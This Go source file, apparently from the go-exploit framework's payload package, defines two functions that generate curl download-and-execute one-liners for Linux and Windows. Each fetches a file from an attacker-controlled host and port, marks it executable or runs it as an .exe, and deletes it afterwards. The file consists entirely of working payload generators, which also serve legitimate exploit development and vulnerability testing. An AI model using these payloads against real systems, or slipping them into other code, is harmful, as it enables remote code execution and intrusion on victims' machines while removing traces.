package payload

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/random"
)

func LinuxCurlHTTPDownloadAndExecute(lhost string, lport int, ssl bool, downloadFile string) string {
	output := "/tmp/" + random.RandLetters(3)

	if ssl {
		return fmt.Sprintf("curl -kso %s https://%s:%d/%s && chmod +x %s && %s & rm -f %s",
			output, lhost, lport, downloadFile, output, output, output)
	}

	return fmt.Sprintf("curl -so %s http://%s:%d/%s && chmod +x %s && %s & rm -f %s",
		output, lhost, lport, downloadFile, output, output, output)
}

func WindowsCurlHTTPDownloadAndExecute(lhost string, lport int, ssl bool, downloadFile string) string {
	output := `%TEMP%\` + random.RandLetters(3) + ".exe"

	// NOTE: Can't delete a file in use
	if ssl {
		return fmt.Sprintf("curl.exe -kso %s https://%s:%d/%s && %s & del /f %s", output, lhost, lport, downloadFile, output, output)
	}
	return fmt.Sprintf("curl.exe -so %s http://%s:%d/%s && %s & del /f %s", output, lhost, lport, downloadFile, output, output)
}
